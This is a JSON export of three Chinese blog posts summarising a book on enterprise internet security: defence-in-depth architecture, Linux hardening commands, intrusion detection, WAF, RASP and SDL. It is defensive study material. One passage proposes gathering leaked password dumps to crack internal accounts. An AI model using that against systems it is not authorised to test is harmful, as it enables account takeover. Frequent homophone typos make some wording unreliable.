数据流视觉1.网络(安全)设备：防火墙、WAF、NIDS（在大型IDC这些产品可能不一定是盒子，而是分布式软件，module或agent的形式）2.OS层：HIDS数据，系统原始日志，应用层日志3.运行时环境：JVM、Zend解析器的定制日志，形式上属于OS层面可以采集的数据4.数据层：数据库、缓存以及大型的分布式数据库中间件代理所产生的访问和安全告警5.漏洞信息：由网络扫描器或主机本地agent搜集的漏洞信息6.资产和配置管理数据：iplist属于基础数据 上面做得比较好，可以考虑第三方威胁情报数据（IP信誉、恶意域名、灰色URL） 服务器视觉服务器负载均衡可能会充当WAF和人机识别模块 应用需要RASP运行时环境的沙箱检测 HIDS 大数据日志采集agent（比如Flume） SQL / DB审计 IDC视角IDC跨全球区域， 一般跟随运维基础架构，比如运维是多中心分治，安全数据也不会可以最求到汇聚点聚合。 敏感国家地区遵从合规性，可采用区域分治原则 逻辑攻防视角对于企业的生产网络，最外围的威胁如下： 4层流量型DDoS DNS瘫痪 链路劫持 最外层抗DDoS 之后快速收敛入口，减少攻击面（Firewall：4层防火墙） 应用层防御：HTTP(S）是WAF，其他协议NIDS，CC等7层DDoS可以使用7层的抗DDoS人机识别，通常类似WAF的软件模块 之后是7层更后端的应用代码的运行时状态，一般以检测webshell为主，小规模环境可以用RASP模块检测OWASP TOP10的大多数漏洞类型 再往后是应用层与系统从之间：sql注入或拖库——SQL审计，SSH暴力破解——系统日志分析，直接调用系统命令并未完全获得系统权限——webshell检测 攻击链末端是获取系统权限：防御者模型是检测提权和rootkit，对应的解决方案通常是HIDS 不同场景下的裁剪上面上全套对于大多数企业来说还是太贵，只能做一些妥协和裁剪 IDC规模大小的区别 4层抗DDoS的成本很高，也可以依赖第三方，不要对效果有过分的期望 没有条件做网络分光，就老实扫描器+Web日志分析也能顶用 自研HIDS是奢侈品，市值小于100亿美元，建议用现成开源的 RASP也是奢侈品，WAF不能很好利用就不要去弄 SQL审计也有点小奢侈，如果有较大自行能在CGI层解决SQL注入，也可以忽略这个 不同的业务类型如果业务流量大部分是http类型，重点投入WAF、RASP和WEB扫描器，NIDS/NIPS可以忽略，如果有条件搞HIDS，优先关乎用户态检测，比如webshell和提权 而非HTTP协议，如SSH、MySQL等通用协议而不是私有的话，网络部分可以考虑NIDS，数据库部分使用SQL审计。 而小西街口、远程过程调用、数据缓存和持久化中私有协议占多数，就不考虑NIDS和SQL审计，而转向HIDS，私有协议对于入侵者来说是一道门槛，被渗透概率不搞，所以更多关乎操作系统本身。 非web业务，入存储节点，关注操作系统入侵，HIDS，重点在后门程序和Rootkit的检测 安全感的底线无论如何追求性价比，安全感总有一个底线 入侵者能随意操纵数据库/用户数据（不一定需要数据库权限或者系统root权限） 渗透到达了操作系统这一层（得到了shell，无论是普通用户还是root） 最起码对于这两个环节上具备一定的入侵感知能力，不至于发生了如此严重的事情还没有半点告警， 所以尽可能在数据库（或者数据访问层（Data Access Layer）：DAL是应用程序与数据库之间的一个中间层）和主机这两个层面设防。 分阶段的安全体系建设宏观过程 第一个阶段是基础安全策略的实施 第二个阶段是进入系统性建设——各个维度的安全防御手段 第三阶段，系统化建设，安全运维和SDL成体系后，可以选择性关注业务安全的问题（通常以账户安全为切入点，之后选择主营业务中风险最大的IT流程活动做相关的业务风险分析和业务封控体系建设） 之后是进入运营缓解，把每一个防御点打磨到极致。 最后进入自由发挥区间。 清理灰色地带第一阶段： 资产管理的灰色地带（资产管理系统数据不准确，遗漏安全检查和监控，或者急忙上线漏掉了安全扫描） 安全措施的覆盖率和健康状态 ACL的有效性 第二阶段 清理远程登录弱口令 清理Web应用的漏洞：SQL注入、文件上传点、struct2等RCW漏洞 清理服务器端口：盘点不必要的服务和协议，排查高危端口 之后投入到纵深防御+入侵感知体系建设才会事半功倍 建立应急响应能力组织运维：补丁和配置更改的具体实施工作产品团队：代码级别的漏洞修复安全防御体系建设小组负责在相关的乳清感知体系中update对于该漏洞的检测规则 流程 一般性漏洞与普通bug修复流程一样 对于比较严重的漏洞，通常由安全、运维、产品的leader开会制定专门的漏洞修补和应急计划 修复时效：根据漏洞类型和影响程序决定 对于短时间无法修复，可使用临时规避措施 技术 发现得快依赖于乳清感知体系 修的快依赖于持续集成和自动化发布工具的支持 同样，自动化运维能力主要属于运维的职责，也会影响漏洞修复和安全策略的实施效率 总结：1.发现得快；2.修得快；3.修不了，临时规避 运营环节比如漏报的根因分析流程 单点检测深度不足?——选取的检测维度不够?——覆盖率不足？——安全产品的可用性？——数据质量？（数据非安全相关或者中低风险的告警太多）——人的问题？","categories":[],"tags":[{"name":"企业安全","slug":"企业安全","permalink":"https://www.giantbranch.cn/tags/企业安全/"}]},{"title":"《互联网企业安全高级指南》之技术篇","slug":"《互联网企业安全高级指南》之技术篇","date":"2023-09-09T00:00:00.000Z","updated":"2023-11-08T07:54:23.321Z","comments":true,"path":"2023/09/09/《互联网企业安全高级指南》之技术篇/","link":"","permalink":"https://www.giantbranch.cn/2023/09/09/《互联网企业安全高级指南》之技术篇/","excerpt":"","text":"防御架构原则防守体系建设三部曲三个层面的攻防对抗：信息对抗、技术对抗、运营能力对抗 信息对抗：知己知彼，情报优势 技术对抗：高维防守、建立优势、工程化 运营能力对抗：闭环运营、执行力 大规模生产网络的纵深防御架构互联网安全理念作者赞同腾讯的“河防”以及数字公司（应该指的360 ）用的“塔防”概念 互联网安全的几个核心需求：快速检测、有限影响、快速溯源、快速恢复 攻击者视角Plan-A：直接从目标系统正面找漏洞，getshell，提权，后面扩大战果，安全建设的思路要阻止攻击者扩大战果Plan-B：曲折迂回，从周围信任域开始下手（包括arp重定向、可嗅探的、可会话中间人的、可链路劫持的、相同内网的、密码满足同一规律的、互联互通信任关系的，灾备或者镜像站点等），获取一个点之后再折返，之后与A类似Plan-C：社会工程学，针对管理员和办公网的APT，水坑攻击。 防御者模型纵深防御体系：安全域、基于第二层的隔离、端口协议过滤、APP安全、Container层安全、OS层防御和提权、防止内核空间乱入、Hypervisor保护 第一层：安全域的划分，是对业务的抽象不是对物理服务器的划分；他们不一定同一个物理机房，但对应相同的安全等级，共享相同的访问控制策略（目的希望将安全事件的最大范围控制在一个安全域中） 第二层：基于数据链路层的隔离，使用VPC、Vxlan、Vlan等方法在安全域的基础上对一组服务器更细的粒度再画一道防线，进一步抑制单点沦陷后受害源扩大的问题 第三层：端口状态协议过滤，这是大多数防火墙的应用场景。解决对黑客暴露的攻击面问题。 第四层：APP安全，主要解决认证鉴权、注入、跨站和上传的应用层漏洞。 第五层：容器和运行时的环境。应用程序有漏洞，也不希望攻击者直接跳转到系统权限，方法是容器加固，比如阻止一些危险函数的运行，比如上传了webshell但是不被解析执行。 第六层：OS层防御，系统加固，主要对抗提权，SMAP(Supervisor Mode Access Prevention,管理模式访问保护)和SMEP(Supervisor Mode Execution Prevention,管理模式执行保护)、DEP、ASLR、stack-canary等，此外不是特别的需求要干掉LKM【Loadable Kernel Module（可加载内核模块）】，/dev/kmem （一个特殊的设备文件，用于提供对系统内核内存的直接访问。它允许用户级程序读取或写入内核虚拟地址空间中的数据。），限制/dev/mem的全地址空间的读写（/dev/mem 是一个特殊的设备文件，用于提供对系统物理内存的直接访问。它允许用户级程序读取或写入整个物理内存的内容。） 第六层：假如云计算环境，更底层的还有hypervisor 互联网安全架构设计原则 纵深防御 多维防御：同一个攻击多种维度的防御和检测手段；例如SQL注入，第一层WAF，第二层Web日志分析，第三层RASP，第四层SQL审计 降维防御：比如在内核态检测用户态攻击，使用RASP运行时而不是cgi层面检测webshell 实时入侵检测 伸缩性、可水平扩展，无论是WAF、HIDS还是IPS需要能够水平扩展 支持分布式IDC 支持自动化运维：需要能够自动化分发、注册、报告转台、统一策略推送等 低性能损耗 能旁路则不串联 业务无感知 去“信息孤岛”：程序和设备科联动，可关联，IOC信息的兼容、共享和流通。 TCO可控：TCO（Total Cost of Ownership，总拥有成本）可控意味着在管理和运营信息技术（IT）系统或解决方案时，可以对系统的总体成本进行有效的控制和管理。 基础安全措施不管安全实践多么优秀的互联网公司，安全体系都离不开基础安全措施，不然上层的大数据入侵检测如同空中楼阁。在纵深防御中层层设卡，每个环节关注有限的点，使得入侵检测需要的覆盖面（广度）和检测层次（深度）随着攻击面的缩小而大幅缩减。 安全域划分目的是将一组安全等级相同的计算机划入同一个安全域，对他们设置相同的网络边界，在网络边界上以最小权限开放对其他安全域的NACL（网络访问控制列表/策略），将域内计算机暴露的风险最小化，在发生攻击或蠕虫病毒是能将威胁最大化地隔离，减少域外时间对域内系统的影响 传统的安全域划分通常分为DMZ区和内网，还会通过硬件防火墙的不同端口来实现隔离，这种只适用于办公网络，对于大规模生产网络已经不适用。 DMZ（Demilitarized Zone，非军事区）是一个位于网络边界内的区域，用于隔离内部受信任的网络与外部不受信任的网络之间的安全边界。 典型的Web服务有三层：接入层、应用层、数据层。 接入层：只开放80与443端口应用层：工程技术人员可通过堡垒机访问应用层数据库层：授权的第三方可通过ssh远程连接访问指定的数据层资源 其余所有端口默认阻断 安全域划分没有限定一定划分vlan，可以基于L3、L4的防火墙规则，甚至NAT都可以起到隔离作用。基于L2的划分比L3及之后的更可靠一点。 大型系统安全域划分把不同的业务（垂直纵向）以及分层的服务（水平横向）一个个切开，在南北向的APT调用上保留最小权限的访问控制，在东西向如无系统调用关系则彼此隔离。 小网络可以做得很细，大网络的运维工作量大，需要妥协折中的策略。 生产网络和办公网络只介绍生产网络和办公网络链接所涉及的安全域问题，为保证最大的隔离，尽可能采取如下措施： 生产网络的ssh 22端口在前端防火墙或者交换机上默认阻止访问 远程访问（运维连接）通过VPN或者专线链接到机房生产网络 通过生产网络的内网而非外网登录个服务器或者自动化运维平台 办公网络中运维环境、发布源和其他OA环境VLAN隔离 虽然同一个物理办公地点，但运维专线和帮贡网络的接入链路各自独立 为保证可用性，运维专线最好有两条以上且来自不同的ISP，防止单链路故障时，无法运维 跳板机有所有的运维操作审计。 系统安全加固 所有安全工作的第一步，可以归入安全基线 Linux加固 禁用LKM：规避knark、adore这类LKM RootKit（通过配置只是治标，治本是在编译内核的时候去掉LKM的支持） 限制/dev/mem，新版linux不再有/dev/kmem, 要确保CONFIG_STRICT_DEVMEM设置为y 123456root@vps1:/boot# cat config-`uname -r` | grep DEVKMEMroot@vps1:/boot# cat config-`uname -r` | grep DEVMEMCONFIG_DEVMEM=yCONFIG_ARCH_HAS_DEVMEM_IS_ALLOWED=yCONFIG_STRICT_DEVMEM=y# CONFIG_IO_STRICT_DEVMEM is not set 内核参数调整 /proc/sys/kernel/randomize_va_space ： ASLR，0是关闭，1是mmap base、stack和vdso page随机化，heap没有，2才增加了heap的随机化/proc/sys/kernel/kptr_restrict 1：限制非特权用户对内核指针的访问，只有具有root权限的进程才能读取和使用内核指针。/proc/sys/vm/mmap_min_addr是Linux内核中一个虚拟内存子系统的参数。它用于限制非特权用户在较低的虚拟内存地址范围内进行内存映射的能力。 设置为65536 禁用NAT：攻击者内网渗透会在边界开启端口转发，/proc/sys/net/ipv4/ip_forward，设置为0，假如无缘无故变为1，可能出了安全问题（但有些服务可能需要这个功能，） Bash日志： 家目录的.bash_history， 下面配置可以加到.bashrc中 设置环境变量为只读 123456readonly HISTFILEreadonly HISTFILESIZEreadonly HISTSIZEreadonly HISTCMDreadonly HISTCONTROLreadonly HISTIGNORE 为history添加时间戳 1exportHISTTIMEFORMAT=&apos; %F %T &apos; 设置history文件只能追加 1chattr +a ~/.bash_history 禁用其他shell 更改HISTFILE为其他文件，并保留原路径下的.bash_history 1HISTFILE=/usr/local/log/cmd 高级技巧 高阶的做法就是修改shell本身，对所有执行的命令无差别地记录 修改shell源码是一种方式，直接修改libc会更加高效，涉及的对象是exec函数族 123456int execl(const char *path, const char *arg0, ... /* (char *) NULL */);int execv(const char *path, char *const argv[]);int execle(const char *path, const char *arg0, ... /* (char *) NULL, char *const envp[] */);int execve(const char *path, char *const argv[], char *const envp[]);int execlp(const char *file, const char *arg0, ... /* (char *) NULL */);int execvp(const char *file, char *const argv[]); exec 函数族的底层实现通常会调用 execve 函数。这是因为 execve 函数是 exec 系列函数中最底层、最通用的函数。 修改以上库函数，支持额外的syslog，就能记录所有运行过的程序。 另一种shell审计的高级方式是将shell的log统一收集后基于机器学习，学习正常管理员的shell命令习惯，而不是以静态规则定义黑白名单。 应用配置加固 目录权限 安全圈流行：可写目录不解析，解析目录不可写 Web进程以非root运行 过滤特定的文件类型：比如通过web配置的rewrite规则，将.bak .log .zip（这个看情况） .sql 等后缀的访问，重定向到特定的页面 远程访问ssh使用v2版本能，并禁止root用户远程登录 账户密码对付暴力破解最有效的方式是多因素认证或非密码认证 收集各种社工库，把内部测试研发运维的常用弱密码做成字典，周期性地更新字典并主动尝试破解公司内的各个系统的账户，能破解的都视为弱密码。 网络访问控制生产网络多层NACL：第一层 FW，第二层交换机（简单的NACL） ，第三层服务器（系统自导的防火墙就够用了） 补丁管理自动化运维：大量push补丁ITSM（信息技术服务管理）成熟度：不影响在线服务可用性架构容灾能力：支持有损服务，灰度和滚动升级系统能力：提供热补丁，无需重启快速单个漏洞扫描：补丁push成功后的检测 日志审计一般建好第几，初步纵深防御建立起来才搞SOC（安全运营中心） 初期可以关注重要的，比如 lastlog和/var/log/secure，看看是否有非雇员登录 服务器4A4A是指： 账户、认证、授权和审计 对于大规模的服务器集群，不太可能，每台服务器单独维护用户名和密码 一个是基于LDAP 一个基于堡垒机 网络安全网络入侵检测传统商业NIDS 开源的snort 大型全流量NIDS——基于大数据的NIDS架构 分层结构，所有节点可水平扩展 检测与防护分离，性能与可用性大幅提升 报文解析与攻击识别完全解耦，入侵检测环节后移 依赖大数据集群，规则数量不再成为瓶颈，而且不在基于静态特征而是能多维度建模 T级DDoS防御多层防御结构 第一层：ISP近源清洗第二层：云清理/CDN硬抗第三层：DC级近目的的清洗 链路劫持 加密的DNS：比如DOT DOH等 全站HTTPS 登录过程加密：前端页面加密后再提交服务器 跨IDC传输加密 Web应用防火墙 cname部署 module部署：ModSecurity 网络层部署 混合型WAF架构 入侵感知体系主机入侵检测（HIDS）开源产品 OSSEC MIG： 开源的分布式取证框架，不算严格意义的HIDS OSquery：将操作系统当作数据库，用sql语句查询 检测webshell 静态检测：可以多维度检测：文件数组，生成时间/目录、inode、上传的目录 流量监测 RASPJava：基于高危行为组合的检测模型、基于调用栈的检测模式 数据库审计解决：SQL注入拖库、操作违规的审计 部署：旁路型、主机型、代理型 入侵检测数据分析平台全局的信息汇聚与分析，将上面提到的数据进行汇聚和分析 漏洞扫描扫描分类ACL扫描：避免无需对外开放的ip或者端口暴露公网弱口令扫描系统及应用服务漏洞扫描Web漏洞扫描 应对大规模的资产扫描 简化漏洞评估链，减少扫描任务 减少网络开销与被检查者的性能损耗 减少漏洞扫描的种类 减少收工确认的工作量 实践中： 不做全网漏扫，先做端口扫描，减少扫描的任务 做好高危端口监控 系统和应用扫描，不完全依赖扫描器，可借助本机agent的扫描 移动应用安全代码审计Coverity 办公网络安全安全域划分一般针对大型企业 分类示例： OA服务器域、事业部A桌面域、事业部B桌面域 而在桌面域可以细分，重度PC用户（运维、研发）、中度PC用户（运营、市场、媒体）、轻度PC用户（客服、线下销售） 重度的策略可以无需过于严格，轻度的可以相对严格的策略 终端管理补丁管理微软自身解决方案中的SCCM第三方终端管理软件中附带的补丁推送功能 组策略作用主要在于实施一些基本的安全策略 终端HIPS（AV）360安全卫士、腾讯管家那些 不过现在微软的defender也不错了 网络准入NAC主流方案： 802.1X （前提是所有交换机都支持802.1X ） C/S模式认证 IEEE 802.1X 是一种网络访问控制（NAC）协议，用于提高局域网（LAN）和无线局域网（WLAN）的安全性。它的主要目的是确保只有经过授权的设备和用户能够访问网络资源，从而减少未经授权的访问和网络攻击的风险。 安全网关 NGFW/FW UTM（统一威胁管理）/反病毒网关/NIPS/反垃圾邮件 堡垒机 行为升级 其他：DLP（数据丢失预防Data Loss Prevention）、抗APT、大数据探针 研发管理 防泄密：研发两台电脑，一个可上网，一个用于coding，不能上网 源代码管理 远程访问vpn：暴力破解问题 虚拟化桌面安全方面有先天优势，尤其是物理安全方面，没有拷贝数据的USB口 APT安全体系需要构建的完备一点此外还可以从陷阱网络和蜜罐入手 DLP数据防泄漏主要通过终端控制、网络出口控制、以及检测网络流量实现 安全管理体系本质是一种方法论和参考维度，ISO27001 安全团队的组织分类 安全KPI：覆盖率、覆盖深度、检出率/主动止损率、TCO（总拥有成本，Total Cost of Ownership）和 ROI（投资回报率，Return on Investment） 外部评价指标：攻防能力、视野和方法论、工程化能力（全线防御、纵深防御、自动化）、对业务的影响力 隐私保护数据分类 访问控制 数据隔离 数据加密 密钥管理 安全删除 匿名化 内容分级：有些需要2FA认证才给访问才行","categories":[],"tags":[{"name":"企业安全","slug":"企业安全","permalink":"https://www.giantbranch.cn/tags/企业安全/"}]},{"title":"《互联网企业安全高级指南》之理论篇","slug":"《互联网企业安全高级指南》之理论篇","date":"2023-09-05T00:00:00.000Z","updated":"2023-11-08T07:54:24.141Z","comments":true,"path":"2023/09/05/《互联网企业安全高级指南》之理论篇/","link":"","permalink":"https://www.giantbranch.cn/2023/09/05/《互联网企业安全高级指南》之理论篇/","excerpt":"","text":"安全大环境与背景对于有一定IT资产的企业，企业安全不是发现漏洞然后修复漏洞，在设置一下防火墙之类的。 攻防只解决了一半的问题，安全的工程化以及体系化的安全架构设计能力也是同样重要的。 安全建设包含：组织、管理、技术，组织 就是安全组织 作者认为的企业安全：从广义的信息安全或者狭义的网络安全出发，根据企业自身所处的产业低位、IT总投入能力、商业模式和业务需求为目标，而建立的安全解决方案以及为保障方案实践的有效性而进行的一系列系统化、工程化的日常安全活动的集合。 企业安全7大领域 网络安全：基础、狭义但核心的部分，聚焦纯技术 平台和业务安全：所在行业和主营业务相关的安全管理 广义的信息安全：纸质文档、客户隐私、内部邮件、会议内容等 IT风险管理、IT审计&amp;内控：风险的识别、评估和应对，审计合规 业务持续性管理：BCM（Business Continuity Management），组织制定和实施一系列策略、计划和程序，以确保在面对各种内部或外部的灾难、事故或业务中断时，能够维持关键业务的连续运行，并尽快恢复正常运营。 安全品牌营销、渠道维护：为品牌的安全形象出席一些市场宣介 CXO的其他需求：俗称打杂 在甲方，安全不是主营业务，归根结底，安全是一个保值型的后台智能，不是一个明显能创造收益的前台职能，是一个成本中心而非盈利中心。 核心：看产出是否对主营业务有帮助，工作成果能不能转化为主营业务竞争力 BCP（Business Continuity Plan）：业务持续性计划，是一份组织为应对各种内部或外部的灾难、事故或业务中断而制定的详细计划。 DRP（Disaster Recovery Plan）：灾难恢复计划，是一种面向信息技术系统和基础设施的计划，旨在在信息系统遭受破坏或中断时，尽快恢复其正常运行状态。 BS25999是一项国际标准，全称为《业务持续性管理》（Business Continuity Management）的英国标准。BS25999标准于2012年被国际标准化组织（ISO）正式接纳并发布为ISO 22301标准，通过遵循ISO 22301标准，组织可以建立一个系统化和综合的业务持续性管理体系，以增强对潜在中断的应对能力，并最大限度地减少对业务的影响。 通过遵循ISO 27001标准，组织可以建立一个系统化和综合的信息安全管理体系，以确保信息资产得到恰当的保护，减少信息安全风险，增强信息安全意识，以及满足法律法规和利益相关者的要求。 BS7799已经被ISO 27001所取代，因此在实践中，更推荐使用ISO 27001标准来建立信息安全管理体系。 推荐做法： 互联网公司：1. 网络安全 2. 平台和业务安全 5. 业务持续性管理 传统行业：1. 网络安全 3. 广义的信息安全 4. IT风险管理、IT审计&amp;内控 5. 业务持续性管理 互联网安全工作包括： 信息安全管理：设计流程、整体策略 基础架构与网络安全：IDC、设备、服务器、中间件数据库，还有漏洞扫描、补丁、ACL、安全配置、网络和主机入侵检测。 应用与交付安全：对产品进行安全评估、代码审计、渗透测试，应用层防火墙和入情监测。 业务安全：账户安全，交易封控、征信、反价格爬虫、反作弊i、反bot程序、反欺诈、反钓鱼、反垃圾信息、舆情监控、防游戏外挂、打击黑色产业链、安全情报等。 互联网企业和传统企业在安全建设中的区别 传统企业安全问题特征： IT资产相对固定 业务变更不频繁 网络边界比较固定 IDC规模不会很大，甚至没有 使用基于传统的资产威胁脆弱性的风险管理的方法，加上购买和部署商业安全产品（解决方案）通常可以搞定 大型互联网企业： 海量IDC和海量数据 完全的分布式架构 应对业务的频繁发布和变更 同时架构层面需要关注：高性能、高可用性、（水平）扩展性、TCO（ROI） 注： TCO (Total Cost of Ownership) 和 ROI (Return on Investment) 都是用于评估和分析企业投资决策的概念。TCO（总拥有成本）是指在使用某个产品或服务的全寿命周期中所涉及的所有费用。ROI（投资回报率）是一种衡量投资效益的指标，用于评估投资项目的经济回报。 互联网企业分为生产网络和办公网络，而某些传统企业可能只有办公网络，随着数字中国推进，传统企业也会有自己的生产网络。 互联网企业的生产网络都是以攻防为驱动，关注性能损耗、运维成本和软件成本，会把在服务器上装防病毒软件这个方案干掉 机房规模大了，不可能部署n个硬件盒子，需要适应分布式的系统架构 所以最终的解决方案应该是：自研或者对开源软件进行二次开发+无限水平扩展的软件架构+构建于普通中低端硬件之上（PC服务器甚至是白牌）+ 大数据机器学习的方式。 甲方安全建设方法论从零开始 三张表： 组织结构图、 线上产品和交付团队（包括其主要负责人的映射） 全网拓扑、各系统的逻辑架构图、物理部署图、各系统间的调用关系、服务治理结构、数据流关系等 历史遗留问题：需要类是灰度滚动升级的方式去做一轮线上系统的后门排查 初期三件事：- 事前的安全基线 - 建立是中的监控能力 - 做好事后的应急响应能力：应急时间成本更短，溯源和根因分析能力更强 不同阶段的安全建设重点 站后重建：救火阶段过去，进入正式的安全建设期，基础的安全建设，做生产网络和办公网络的网络安全的基础部分，在实践上不落后与公司的整体技术步伐，向自动化看齐 进阶：一是冠以的信息安全：ISO27001可以拿出来看看了，二是业务安全，比如盗号 优化器：开源工具不足以支撑业务规模，进入自研工具时代。一般要分拆团队，另外招人 对外开放：安全能力对外开放，成为一方 如何推动安全策略 公司层面：自上而下地推动 战术层面：与研发和运维是合作关系，建立良好的人际关系，让开发掌握更好更安全的技能而产生正向驱动力。 选择不同维度做防御 技术实现维度: 选择某一层或者某几层去设防和封堵 一题多解：解决一个问题有多种解决方案 跨时间轴的肠镜：临时性规避措施——push补丁/根治措施——取消临时性措施——添加常态性的特征检测措施——检测到漏网之鱼——继续上述过程 风险和影响的平衡：风险暴露程序、研发运维变更成本和用户体验的负面影响三者的平衡 修复成本的折中：业务影响力大，时间人员成本小，是最高优先级；业务影响很小，但是实践人员成本大，这个应该是直接砍掉这个需求，做这个比较亏。· 需要自己发明安全机制吗一般来说直接使用现成的就行，比如DEP、ASLR、操作系统基带的RBAC（基于角色的访问控制） 假如需要解决的是单一问题，用救火的方式，假如是一类问题才考虑如何更好地解决这一类问题，如果在微观细节上补洞总是补不完，不放看看更高抽象层次有没有解决方案，有没有新的路径解决这个大类的问题。 如何看待SDLSDL（安全开发声明周期） 目前SDL包含： 培训：核心安全培训 要求：确定安全要求、创建质量门/Bug栏、安全和隐私风险评估 设计：确定设计要求、分析攻击面、威胁建模 实施：使用批准的攻击、启用不安全的函数、静态分析 验证：动态分析、模糊测试、攻击面评析 发布：时间相应计划、最终安全评析、发布存档 响应：执行事件响应计划 安全设计 最小攻击面 深度防御 最小权限原则 安全默认设置 威胁建模 威胁建模概述：威胁建模（Threat Modeling）是一种通过分析系统或应用程序的设计和实现，识别威胁和潜在漏洞的方法。通过威胁建模，可以帮助企业提前发现和预防安全漏洞，以及为安全决策提供数据支持。 威胁建模的设计意义 基于威胁模型的编码约束 以下是威胁建模的一般步骤： 确定资产：确定需要保护的资产类型和重要性，例如机密数据、知识产权等。 构建系统和流程架构：通过绘制图表或使用其他工具，建立应用程序或系统的逻辑架构图，包括各种数据源、处理和存储组件、用户界面和网络连接。 定义攻击者模型：确定系统中可能的攻击者和攻击方式，例如黑客、内部员工、供应商或合作伙伴等。 识别威胁：基于攻击者模型，识别可能的威胁和攻击，例如SQL注入、跨站点脚本攻击、社交工程攻击等。 评估威胁严重性：对每个识别出的威胁进行概率和严重性评估，确定其风险级别。 提出对策：针对识别出的威胁，提出相应的安全措施和防御措施，包括技术控制、流程和策略、培训和意识提高等方面。 验证措施：对提出的防御措施进行测试和验证，确定其有效性和可行性。 需要注意的是，威胁建模并非一次性的过程，需要随着应用程序或系统的变化不断更新和维护。此外，威胁建模需要针对不同的应用程序或系统进行定制化，考虑到其特定的业务需求和技术实现。最后，威胁建模不是万能的，不能保证完全避免所有的安全漏洞和攻击。但是，它可以帮助企业减少风险，并更好地处理安全事件。 安全编码： 缓冲区溢出 整数算法错误 跨站点脚本 SQL注入 弱加密 安全测试： 安全测试与功能测试之间的区别 风险评估 安全测试方法：黑盒测试（渗透测试）、白盒测试（渗透测试）、压力测试、代码审查 安全测试和功能测试是软件测试的两个不同方面，它们主要关注的是不同的目标。 功能测试是验证软件系统是否按照规定的需求和预期功能进行工作。它确保软件的各项功能在各种条件下正常运行，包括用户界面、数据处理、业务逻辑等。功能测试主要关注系统是否能够正确地执行特定任务，如输入验证、功能覆盖等，并且通常以预期结果为基准进行验证。 而安全测试是为了评估软件系统的安全性能和强度。它专注于发现系统中可能存在的安全漏洞、风险和潜在威胁，并提出相应的建议来增强系统的安全性。安全测试旨在模拟真实的攻击场景，包括黑盒测试和白盒测试，测试人员会尝试以各种方式绕过访问控制、注入恶意代码、暴露敏感信息等。 因此，安全测试和功能测试在测试目标、方法和侧重点上存在一些区别： 测试目标：功能测试主要关注系统的功能和操作是否正常；安全测试重点关注系统的安全漏洞和潜在的威胁。 测试方法：功能测试通常采用黑盒测试或白盒测试，关注输入和输出的正确性；安全测试则会使用更多的黑盒测试和渗透测试来模拟真实攻击并评估系统的防御能力。 侧重点：功能测试关注系统功能的完整性和正确性；安全测试则侧重于发现系统的弱点和漏洞，以及提供相应的修复建议。 需要注意的是，功能测试和安全测试是相辅相成的，两者都是保证软件质量和安全性的重要组成部分。综合进行功能测试和安全测试，可以确保软件系统不仅具备基本功能，还能够抵御各种潜在的安全威胁。 隐私 隐私敏感数据的类型 隐私设计的最佳实践 风险评估 隐私开发的最佳实践 隐私测试的最佳实践 隐私开发的最佳实践是在软件和应用程序的开发过程中，将隐私保护作为核心原则并采取相应的措施。以下是一些隐私开发的最佳实践： 数据分类和敏感性评估：对所处理的数据进行分类，确定敏感数据的范围和安全级别，并进行相应的风险评估。 数据加密：采用适当的加密算法和加密技术，对存储在数据库、传输过程中的数据进行加密，确保数据在非授权访问时无法被读取或理解。 用户授权和访问控制：实施身份验证和授权机制，确保只有经过授权的用户才能访问和处理敏感数据。包括使用强密码、多因素身份验证等来增强用户的账户安全性。 匿名化和脱敏处理：对敏感数据进行匿名化或脱敏处理，以减少个人身份的识别风险。 最小权限原则：给予用户和程序仅必要的权限，避免过度收集和访问用户的个人信息。 错误处理和日志记录：合理记录和审计系统操作和错误信息，及时检测和响应潜在的安全事件和隐私问题。 安全漏洞管理：及时监测和修复软件中的安全漏洞，定期进行安全评估和渗透测试，确保系统的安全性。 隐私政策和通知：制定明确的隐私政策，并将其通知给用户，告知数据收集、使用和共享的目的和方式。 第三方服务供应商的选择和审查：对于使用第三方提供的服务或工具，要评估其隐私和安全措施，确保他们符合合规要求。 员工培训和教育：对开发人员和相关人员进行隐私意识和最佳实践的培训，确保团队整体上具备隐私保护的意识和技能。 综上所述，隐私开发的最佳实践需要全面考虑软件和应用程序的整个生命周期，从需求分析到发布和运营过程中都应当注重隐私保护，并采取相应的技术和管理措施来保障用户的隐私权益。 隐私测试是评估应用程序、系统或产品在处理用户个人信息时是否符合隐私保护要求的过程。以下是一些隐私测试的最佳实践： 设计测试方案：根据隐私保护的相关法规、标准和最佳实践，制定详细的测试方案，明确测试目标、范围和方法。 数据分类和敏感性评估：对测试所使用的数据进行分类，确定敏感数据的范围和安全级别，并进行相应的风险评估。 合规性检查：评估应用程序、系统或产品是否符合相关法规和隐私保护的最佳实践，包括隐私政策、用户授权和访问控制、数据加密和匿名化等方面的要求。 数据收集和使用测试：验证应用程序、系统或产品是否按照隐私政策中规定的目的和方式收集和使用用户个人信息，是否尊重用户的选择和权利。 安全性测试：检查数据传输和存储的安全性措施，包括加密算法、访问控制、身份验证等方面的测试，以确保数据在传输和存储过程中的安全性。 第三方服务供应商测试：评估第三方服务供应商是否符合隐私保护的要求，包括数据处理和共享、数据安全管理等方面的测试。 用户权益测试：验证用户在隐私保护方面的权益是否得到充分保障，包括访问、修改、删除个人信息的测试，以及用户投诉和申诉机制的测试。 日志和审计测试：确保应用程序、系统或产品具备适当的日志和审计功能，记录关键操作和事件，以便追踪和调查潜在的隐私问题。 跨平台和跨设备测试：针对不同的操作系统、设备和网络环境，测试应用程序、系统或产品在不同环境下的隐私保护能力。 审查测试报告和改进措施：综合测试结果，编写详细的测试报告，并提出改进建议和优化措施，以进一步完善隐私保护。 综上所述，隐私测试需要综合考虑法规、标准和最佳实践，涵盖数据分类、合规性检查、安全性测试、用户权益测试等多个方面。通过全面的隐私测试，可以识别和解决可能存在的隐私问题，确保应用程序、系统或产品符合隐私保护的要求。 高级概念方面的培训 高级的安全设计和体系结构 可信用户界面设计 安全漏洞细节 实施自定义威胁缓解 攻防驱动修改 事前基线：Web安全编码标准，开发部门不强制不考试可能一直没人看的东西 事中措施：代码审计，发布前过一轮扫描器+渗透测试 事后机制：HTTP全流量IDS，Web日志大数据分析，等等 事件驱动：发现了新的安全问题就“事后诸葛亮一把”，做点不就行措施 SDL落地率低的原因 DevOps的交付模式：互联网交付节奏快，没有足够事件去思考安全，而SDL会拖慢发布的节奏，需要经验丰富的安全人员和自动化工具的支持 历史问题：甲方安全团队都是以救火方式开始的，SDL不是安全建设的第一个想到的事情。还需要摆平研发 业务模式：互联网以Web为主，事后修补成本低，加上产品生命周期不长。 